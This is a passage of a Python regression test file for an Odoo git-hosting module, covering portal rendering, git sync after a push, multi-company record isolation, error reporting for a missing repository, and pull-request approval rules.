                         ref='main', path='')
        self.assertIn('error', out)

    def test_missing_repository_on_disk_is_reported(self):
        ghost = self.env['git.repository'].create({
            'name': 'never-created', 'owner_id': self.user.id})
        self.env.flush_all()
        out = self._call(f'/api/git/repositories/{ghost.id}/tree', path='')
        self.assertEqual(out.get('error'), 'no_repository')


@tagged('regression', 'post_install', '-at_install')
class TestPortalRoutes(HttpCase):
    """Portal pages referenced models deleted three commits earlier."""

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.owner = cls.env['res.users'].create({
            'name': 'Portal Owner', 'login': 'portal-reg',
            'email': 'p@t.com', 'password': 'portal-reg-pw',
            'group_ids': [(4, cls.env.ref('base.group_user').id)]})
        cls.repo = cls.env['git.repository'].create({
            'name': 'portal-repo', 'owner_id': cls.owner.id,
            'visibility': 'internal'})

    def test_repository_home_renders(self):
        """Regression: template context read repository.issue_ids, a field
        removed with the issues model -> HTTP 500 on every visit."""
        self.authenticate('portal-reg', 'portal-reg-pw')
        res = self.url_open(
            f'/git/{self.owner.login}/{self.repo.name}', timeout=30)
        self.assertEqual(res.status_code, 200)

    def test_my_repositories_renders(self):
        self.authenticate('portal-reg', 'portal-reg-pw')
        res = self.url_open('/my/repositories', timeout=30)
        self.assertEqual(res.status_code, 200)


@tagged('post_install', '-at_install')
class TestSyncFromGitCommits(DwGitCommon):
    """_sync_from_git called a Registry API that Odoo 19 removed."""

    def test_sync_from_git_completes(self):
        """Regression: the guard around cr.commit() called
        `self.env.registry.in_test_mode()`, which Odoo 19 removed. It raised
        AttributeError at the end of _sync_from_git, the post-receive hook
        swallowed and logged it, and pushed branches and commits therefore
        never reached Odoo. Nothing failed loudly — the suite stayed green
        because no test drove this method to completion.
        """
        base = tempfile.mkdtemp(prefix='dw-git-sync-guard-base-')
        self.addCleanup(shutil.rmtree, base, True)
        self.env['ir.config_parameter'].sudo().set_param(
            'dw_git.repo_base_path', base)

        repo = self._repo('sync-guard', visibility='internal')
        repo._init_git_repo()
        path = repo._get_repo_path()
        self.assertTrue(os.path.isdir(path), 'bare repo was not initialised')

        work = tempfile.mkdtemp(prefix='dw-git-sync-guard-')
        self.addCleanup(shutil.rmtree, work, True)
        subprocess.run(['git', 'clone', path, work], check=True,
                       capture_output=True)
        with open(os.path.join(work, 'f.txt'), 'w') as fh:
            fh.write('hello\n')
        for cmd in (['add', '.'],
                    ['-c', 'user.email=t@t.com', '-c', 'user.name=T',
                     'commit', '-qm', 'sync guard commit'],
                    ['push', '-q', 'origin', 'HEAD:refs/heads/main']):
            subprocess.run(['git', '-C', work] + cmd, check=True,
                           capture_output=True)

        # Must not raise, and must persist what it read.
        repo._sync_from_git()

        self.assertTrue(
            self.env['git.branch'].search_count([
                ('repository_id', '=', repo.id), ('name', '=', 'main')]),
            'branch from the pushed ref was not recorded')
        self.assertTrue(
            self.env['git.commit'].search_count([
                ('repository_id', '=', repo.id),
                ('message', '=', 'sync guard commit')]),
            'commit from the pushed ref was not recorded')


@tagged('regression', 'post_install', '-at_install')
class TestMultiCompanyIsolation(DwGitCommon):
    """Record rules never mentioned company_id."""

    def test_internal_repo_is_not_readable_from_another_company(self):
        """Regression: `visibility == 'internal'` was an unqualified OR branch
        in the repository rule, and no rule in the module referenced
        company_id at all. Any employee of any company could therefore read
        every internal repository — and, through the same gap in the child
        rules, its branches, commits and pull requests.

        git.repository carries company_id; everything else reaches it through
        repository_id, so each child rule is scoped along that path.
        """
        other_co = self.env['res.company'].create({'name': 'Other Co'})
        outsider = self._create_user('outsider')
        outsider.write({
            'company_ids': [(6, 0, [other_co.id])],
            'company_id': other_co.id,
            'group_ids': [(4, self.env.ref('dw_git.group_git_user').id)],
        })

        repo = self._repo('cross-company', visibility='internal',
                          company_id=self.env.company.id)
        branch = self._branch(repo, 'main')
        commit = self.Commit.create({
            'sha': 'c' * 40, 'message': 'secret work',
            'repository_id': repo.id,
        })
        pr = self.PR.create({
            'title': 'secret pr', 'repository_id': repo.id,
            'source_branch_id': self._branch(repo, 'feature').id,
            'target_branch_id': branch.id,
        })

        # ir.rule evaluates `company_ids` from env.companies, which reads
        # allowed_company_ids off the CONTEXT and only falls back to the
        # user's own companies. with_user() keeps the calling environment's
        # context, so without setting it here the rule would still be
        # evaluated against the *previous* user's companies — the test would
        # pass in isolation and fail inside the suite. A real HTTP session
        # sets this key from the session, and Odoo raises AccessError if a
        # user tries to widen it beyond their own companies.
        as_outsider = self.env(
            user=outsider,
            context={'allowed_company_ids': outsider.company_ids.ids},
        )

        # the outsider must see none of it
        self.assertFalse(
            self.Repo.with_env(as_outsider).search([('id', '=', repo.id)]),
            "another company's internal repository is readable")
        for record, label in ((commit, 'commit'), (branch, 'branch'), (pr, 'pull request')):
            self.assertFalse(
                record.with_env(as_outsider).search([('id', '=', record.id)]),
                f"another company's {label} is readable")

        # Record rules are not the only gate, and on the paths that matter
        # most they are not the gate at all: the git transport, PAT and
        # deploy-key auth, and the portal all run under sudo(), where
        # ir.rule does not apply. _check_repo_access is what guards those,
        # so assert it directly — scoping only the rules left `git clone`
        # of another company's internal repository working unchanged.
        self.assertFalse(
            repo._check_repo_access(outsider, 'read'),
            "_check_repo_access lets another company read an internal repo; "
            "git clone and the portal bypass record rules via sudo()")
        self.assertFalse(
            repo._check_portal_access(outsider),
            "_check_portal_access lets another company read an internal repo")

        # and the owner must still see all of it — a rule that denies
        # everyone is not a fix
        self.assertTrue(
            self.Repo.with_user(self.user).search([('id', '=', repo.id)]),
            'company scoping broke legitimate access to your own repository')
        self.assertTrue(
            commit.with_user(self.user).search([('id', '=', commit.id)]),
            'company scoping broke legitimate access to your own commits')
        self.assertTrue(
            repo._check_repo_access(self.user, 'read'),
            'company scoping broke transport access to your own repository')


@tagged('regression', 'post_install', '-at_install')
class TestRefreshChangesReportsFailure(DwGitCommon):
    """A user-facing button that reported success on failure."""

    def test_refresh_changes_explains_a_missing_repository(self):
        """Regression: _sync_changed_files() returns False when it cannot
        read the repository, and action_refresh_changes() threw that away
        and returned True. The diff view told the user to press Refresh
        Changes; pressing it did nothing and said nothing. Two lies about
        the same fact.
        """
        base = tempfile.mkdtemp(prefix='dw-git-norepo-')
        self.addCleanup(shutil.rmtree, base, True)
        self.env['ir.config_parameter'].sudo().set_param(
            'dw_git.repo_base_path', base)

        repo = self._repo('never-pushed')          # deliberately not on disk
        pr = self.PR.create({
            'title': 'no repo behind it',
            'repository_id': repo.id,
            'source_branch_id': self._branch(repo, 'feature').id,
            'target_branch_id': self._branch(repo, 'main').id,
        })
        self.assertFalse(os.path.isdir(repo._get_repo_path()),
                         'precondition: the bare repo must not exist')

        with self.assertRaises(UserError) as caught:
            pr.action_refresh_changes()

        message = str(caught.exception)
        self.assertIn(repo.name, message,
                      'the error should name the repository')
        self.assertIn(repo._get_repo_path(), message,
                      'the error should say where it looked')


@tagged('regression', 'post_install', '-at_install')
class TestReviewAndApprovalFlow(DwGitCommon):
    """Review states and approval counts drive merge decisions."""

    def setUp(self):
        super().setUp()
        self.repo = self._repo('review-flow')
        self.main = self._branch(self.repo, 'main', sha='a' * 40)
        self.feat = self._branch(self.repo, 'feature', sha='b' * 40)
        self.pr = self.PR.create({
            'title': 'test review flow',
            'repository_id': self.repo.id,
            'source_branch_id': self.feat.id,
            'target_branch_id': self.main.id,
            'state': 'open'
        })
        self.reviewer = self.other

    def _mergeable_ignoring_conflicts(self, pr):
        """is_mergeable with conflict detection taken out of the picture.

        _compute_mergeable ends with `is_mergeable = can_merge and not
        has_conflicts`, and _check_conflicts returns True whenever it cannot
        read the repository — refusing to merge is its safe default. These
        fixtures have no bare repo on disk, so is_mergeable is False no
        matter how many approvals exist.

        Asserting on it directly would have made the "not mergeable" tests
        pass for the wrong reason and the "mergeable" tests impossible.
        Patching the conflict check isolates the gate under test: the
        REVIEW rules, which is what this class is about.
        """
        with patch.object(
                type(pr), '_check_conflicts', lambda self: False):
            pr.invalidate_recordset()
            return pr.is_mergeable

    def test_approve_review_increments_approval_count(self):
        """An 'approve' review must increment approval_count."""
        self.assertFalse(self.pr.approval_count,
                         'precondition: no approvals yet')
        self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': self.reviewer.id,
            'state': 'approve'
        })
        self.assertEqual(self.pr.approval_count, 1,
                         'approve review did not increment approval_count')

    def test_comment_review_does_not_increment_approval_count(self):
        """A 'comment' review must not increment approval_count."""
        self.assertFalse(self.pr.approval_count,
                         'precondition: no approvals yet')
        self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': self.reviewer.id,
            'state': 'comment'
        })
        self.assertFalse(self.pr.approval_count,
                         'comment review incremented approval_count')

    def test_request_changes_review_sets_changes_requested_true(self):
        """A 'request_changes' review must set changes_requested = True."""
        self.assertFalse(self.pr.changes_requested,
                         'precondition: no changes requested yet')
        self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': self.reviewer.id,
            'state': 'request_changes'
        })
        self.assertTrue(self.pr.changes_requested,
                        'request_changes did not set changes_requested')

    def test_pr_not_mergeable_without_required_approvals(self):
        """A PR requiring 2 approvals must not be mergeable with only 1."""
        self.main.write({
            'is_protected': True,
            'require_pr_reviews': True,
            'required_approving_reviews': 2
        })
        self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': self.reviewer.id,
            'state': 'approve'
        })
        self.assertEqual(self.pr.approval_count, 1,
                         'precondition: only 1 approval')
        self.assertFalse(
            self._mergeable_ignoring_conflicts(self.pr),
            'a PR must not be mergeable with 1 approval when 2 are required')

    def test_pr_mergeable_with_required_approvals(self):
        """A PR with exactly the required approval count must be mergeable."""
        self.main.write({
            'is_protected': True,
            'require_pr_reviews': True,
            'required_approving_reviews': 2
        })
        for i in range(2):
            reviewer = (self.reviewer if i == 0
                        else self._create_user(f'reviewer{i}'))
            self.env['git.pr.review'].create({
                'pull_request_id': self.pr.id,
                'reviewer_id': reviewer.id,
                'state': 'approve'
            })
        self.assertEqual(self.pr.approval_count, 2,
                         'precondition: exactly 2 approvals')
        self.assertTrue(
            self._mergeable_ignoring_conflicts(self.pr),
            'the required approval count is met, so the review gate must pass')

    def test_changes_requested_blocks_merge_despite_approvals(self):
        """A PR with changes_requested must not be mergeable even with
        sufficient approvals."""
        self.main.write({
            'is_protected': True,
            'require_pr_reviews': True,
            'required_approving_reviews': 1
        })
        # Add an approval
        self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': self.reviewer.id,
            'state': 'approve'
        })
        self.assertEqual(self.pr.approval_count, 1,
                         'precondition: approval count is 1')
        self.assertTrue(
            self._mergeable_ignoring_conflicts(self.pr),
                        'precondition: should be mergeable without changes_requested')

        # Now request changes
        other_reviewer = self._create_user('other_reviewer')
        self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': other_reviewer.id,
            'state': 'request_changes'
        })
        self.assertTrue(self.pr.changes_requested,
                        'precondition: changes_requested is true')
        self.assertFalse(
            self._mergeable_ignoring_conflicts(self.pr),
                         'PR mergeable despite changes_requested')

    def test_changing_review_from_request_changes_to_approve_unblocks_merge(self):
        """Changing a review state from request_changes to approve must
        unblock the merge."""
        self.main.write({
            'is_protected': True,
            'require_pr_reviews': True,
            'required_approving_reviews': 1
        })
        # Create a review that requests changes
        review = self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': self.reviewer.id,
            'state': 'request_changes'
        })
        self.assertTrue(self.pr.changes_requested,
                        'precondition: changes_requested is true')
        self.assertFalse(
            self._mergeable_ignoring_conflicts(self.pr),
                         'precondition: should not be mergeable')

        # Change it to approve
        review.write({'state': 'approve'})
        self.assertFalse(self.pr.changes_requested,
                         'changes_requested should be false after removing all request_changes')
        self.assertTrue(
            self._mergeable_ignoring_conflicts(self.pr),
                        'PR should be mergeable after changing to approve')

    def test_review_records_commit_id_on_creation(self):
        """A review with state 'approve' or 'request_changes' must record
        the source branch's commit_id."""
        # Create a commit associated with the feat branch
        commit = self.Commit.create({
            'sha': self.feat.commit_sha,
            'message': 'feature commit',
            'repository_id': self.repo.id
        })
        self.feat.write({'commit_sha': commit.sha})

        # Create an approve review
        review = self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': self.reviewer.id,
            'state': 'approve'
        })
        self.assertTrue(review.commit_id,
                        'approve review did not record commit_id')
        self.assertEqual(review.commit_id.id, commit.id,
                         'commit_id does not match source branch head')

        # Create a request_changes review
        review2 = self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': self._create_user('reviewer2'),
            'state': 'request_changes'
        })
        self.assertTrue(review2.commit_id,
                        'request_changes review did not record commit_id')
        self.assertEqual(review2.commit_id.id, commit.id,
                         'request_changes commit_id does not match source branch head')

    def test_review_from_different_user_counts_separately(self):
        """Reviews from different users must all count towards approval_count."""
        reviewer1 = self.reviewer
        reviewer2 = self._create_user('second_reviewer')
        reviewer3 = self._create_user('third_reviewer')

        self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': reviewer1.id,
            'state': 'approve'
        })
        self.assertEqual(self.pr.approval_count, 1,
                         'first approval not counted')

        self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': reviewer2.id,
            'state': 'approve'
        })
        self.assertEqual(self.pr.approval_count, 2,
                         'second approval from different user not counted')

        self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': reviewer3.id,
            'state': 'approve'
        })
        self.assertEqual(self.pr.approval_count, 3,
                         'third approval from different user not counted')

    def test_same_user_reviewing_twice_counts_both_reviews_as_separate(self):
        """The model does not dedupe reviews by user — each review is
        counted separately, even if from the same user.

        This is the ACTUAL behaviour based on _compute_review_status().
        It counts `len(approvals)`, not `len(approvals.reviewer_id)`.
        """
        self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': self.reviewer.id,
            'state': 'approve'
        })
        self.assertEqual(self.pr.approval_count, 1,
                         'first approval not counted')

        # Same reviewer creates a second review (approve)
        self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': self.reviewer.id,
            'state': 'approve'
        })
        self.assertEqual(self.pr.approval_count, 2,
                         'second approval from same user not counted separately '
                         '(model does not dedupe by reviewer)')

    def test_comment_review_does_not_change_approval_or_changes_requested(self):
        """A 'comment' review must not affect approval_count or
        changes_requested."""
        self.main.write({
            'is_protected': True,
            'require_pr_reviews': True,
            'required_approving_reviews': 1
        })
        self.env['git.pr.review'].create({
            'pull_request_id': self.pr.id,
            'reviewer_id': self.reviewer.id,
            'state': 'comment',
            'body': '<p>This looks interesting</p>'
        })
        self.assertFalse(self.pr.approval_count,
                         'comment incremented approval_count')
        self.assertFalse(self.pr.changes_requested,
                         'comment set changes_requested')
        self.assertFalse(
            self._mergeable_ignoring_conflicts(self.pr),
                         'comment somehow made PR mergeable')
